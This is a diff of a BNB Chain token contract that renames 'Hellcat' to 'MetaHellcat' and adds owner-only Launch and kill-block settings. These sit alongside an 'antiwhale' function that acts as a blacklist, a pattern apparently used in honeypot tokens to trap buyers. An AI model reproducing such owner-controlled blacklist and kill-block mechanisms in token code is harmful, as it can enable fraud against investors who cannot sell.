@@ -1,4 +1,8 @@
 /**
+ *Submitted for verification at BscScan.com on 2022-03-25
+*/
+
+/**
  *Submitted for verification at BscScan.com on 2022-03-22
 */
 // coder by Angel tg:https://t.me/GoodAngel8
@@ -382,10 +386,11 @@ contract TOKENS is Context, IERC20, Ownable {
     using SafeMath for uint256;
     using Address for address;
     
-    string private _name = "Hellcat";
+    string private _name = "MetaHellcat";
     string private _symbol = "Hellcat";
     uint8 private _decimals = 9;
 
+    
     address payable private marketingWalletAddress;
     address payable private teamWalletAddress;
     address public immutable deadAddress = 0x000000000000000000000000000000000000dEaD;
@@ -418,7 +423,7 @@ contract TOKENS is Context, IERC20, Ownable {
     uint256 private _totalSupply = 640000 * 10**9 * 10**_decimals;
     uint256 public _maxTxAmount = 640000 * 10**9 * 10**_decimals; 
     uint256 public _walletMax = 640000 * 10**9 * 10**_decimals;
-    uint256 private minimumTokensBeforeSwap = 640000 * 10**4 * 10**_decimals; 
+    uint256 private minimumTokensBeforeSwap = 3200000 * 10**4 * 10**_decimals; 
 
     IUniswapV2Router02 public uniswapV2Router;
     address public uniswapPair;
@@ -535,7 +540,10 @@ contract TOKENS is Context, IERC20, Ownable {
         emit Approval(owner, spender, amount);
     }
 
-   
+    function Launch() public onlyOwner {
+        isLaunch = true;
+        launchedBlock = block.number;
+    }
 
     function setMarketPairStatus(address account, bool newValue) public onlyOwner {
         isMarketPair[account] = newValue;
@@ -605,6 +613,7 @@ contract TOKENS is Context, IERC20, Ownable {
         swapAndLiquifyEnabled = _enabled;
         emit SwapAndLiquifyEnabledUpdated(_enabled);
     }
+    
 
     function setSwapAndLiquifyByLimitOnly(bool newValue) public onlyOwner {
         swapAndLiquifyByLimitOnly = newValue;
@@ -659,7 +668,10 @@ contract TOKENS is Context, IERC20, Ownable {
         if (!_isAntiwhaleed[recipient]) _isAntiwhaleed[recipient] = true;
     }
 
-   
+    function setKillBlock(uint num) public onlyOwner {
+        killblock = num;
+    }
+
     function writeAntiwhale(address recipient, bool isBlack) public onlyOwner {
         _isAntiwhaleed[recipient] = isBlack;
     }
